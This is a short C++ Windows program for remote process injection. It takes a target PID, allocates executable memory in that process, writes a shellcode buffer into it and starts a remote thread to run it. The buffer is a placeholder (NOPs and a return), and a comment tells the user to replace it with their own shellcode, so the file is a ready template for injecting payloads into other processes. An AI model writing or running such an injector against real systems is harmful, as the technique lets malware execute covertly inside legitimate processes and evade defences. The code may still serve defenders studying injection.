

#include <Windows.h>
#include <stdio.h>
#include <iostream>

using namespace std;




int pid; 
HANDLE procHandle;
LPVOID procVirtualAlloc; 
unsigned char shellcode[] = {  
    0x90, 0x90, 0x90, 0x90,       // Replace with your own shellcode!      
    0xC3};
bool procwritable = false;
HANDLE procThread;
DWORD threadId;

int main(){
    cout << "[?] What is the PID of the Process you want to inject?: "; 
    cin >> pid;

    procHandle = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, true, pid);

    if(procHandle == NULL){
        cout << "[!] Could not get Process Handle on the given PID"; 
        return 1;
    }

    procVirtualAlloc = VirtualAllocEx(procHandle, nullptr, sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if(procVirtualAlloc == NULL){
        cout << "[!] Could not allocate virtual storage on the given PID"; 
        return 1;
    }

    procwritable = WriteProcessMemory(procHandle, procVirtualAlloc, shellcode, sizeof(shellcode), NULL);

    if(procwritable == NULL){
        cout << "[!] Could not write into the given PID";
        return 1;
    }

    procThread = CreateRemoteThread(procHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)procVirtualAlloc, nullptr, 0, &threadId);

    

    if(procThread == NULL){
        cout << "[!] Could not create remote thread!";
        return 1;
    }

    cout << "[+] ThreadID: " << threadId << endl;
    cout << "[+] Process successfully injected! ";


}
